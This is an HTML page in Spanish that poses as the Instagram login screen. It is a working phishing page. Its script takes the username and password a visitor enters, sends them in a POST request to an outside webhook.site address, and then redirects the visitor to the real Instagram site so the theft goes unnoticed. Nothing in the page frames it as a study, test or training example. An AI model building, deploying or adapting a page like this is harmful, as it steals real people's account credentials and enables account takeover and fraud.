<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .main-container { width: 100%; max-width: 350px; padding: 20px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px 40px; text-align: center; }
        .logo-text { font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 14px; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-box">
            <div class="logo-text">Instagram</div>
            <form id="loginForm">
                <input type="text" name="usuario" placeholder="Teléfono, usuario o correo" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            fetch('https://webhook.site/ead7c29b-87ec-48f2-94a1-976c087aec41', {
                method: 'POST',
                body: formData
            });
            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 300);
        };
    </script>
</body>
</html>
